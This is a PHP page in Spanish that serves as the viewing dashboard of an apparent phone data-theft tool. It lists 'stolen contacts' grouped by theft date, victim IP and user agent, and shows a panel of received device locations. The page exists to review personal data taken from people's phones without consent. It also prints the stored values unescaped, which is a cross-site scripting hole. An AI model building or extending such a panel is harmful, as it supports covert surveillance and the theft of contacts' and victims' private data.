<?php
include 'contacts_repo.php';
include 'locations_repo.php';

$contacts_repo = ContactsRepository::getInstance();
$locations_repo = LocationsRepository::getInstance();
?>
<html>
  <head>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">

    <!-- Optional theme -->
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">

    <!-- Latest compiled and minified JavaScript -->
    <script src="js/jquery-2.1.4.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
  </head>
<body>  
  <div class="container">
    <div class="panel panel-primary col-md-6">
      <!-- Default panel contents -->
      <div class="panel-heading"><h1>Contactos robados</h1></div>
      <div class="panel-body">
        <?php foreach($contacts_repo->getPhoneBooks() as $phone_book): ?>
        <div class="row" style="border-top:solid "> 
          <div class="col-md-3"><b>Fecha de robo</b><br><?php echo $phone_book->getRetrievedDate()->format('Y-m-d H:i:s'); ?></div>
          <div class="col-md-3"><b>IP del celular</b><br><?php echo $phone_book->getRemoteAddr(); ?></div>
          <div class="col-md-6"><b>Sistema operativo</b><br><?php echo $phone_book->getUserAgent(); ?></div>
        </div>
        <div class="row">
          <table class="table table-condensed table-bordered"> 
            <thead><tr><th>ID</th><th>Nombre</th><th>Telefonos</th></tr></thead>
            <tbody>
              <?php foreach($phone_book->getContacts() as $contact): ?>
              <tr>
                <td><?php echo $contact->getID(); ?></td>
                <td><?php echo $contact->getName(); ?></td>
                <td><?php echo $contact->getPhonesStringified(); ?></td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
        <?php endforeach; ?>
      </div>
    </div>  
    <div class="panel panel-primary col-md-6">
      <!-- Default panel contents -->
      <div class="panel-heading"><h1>Ubicaciones recibidas</h1></div>
      <div class="container">
        <?php echo $locations_repo->getLocations(); ?>
     </div>
  </div>
</body>
</html>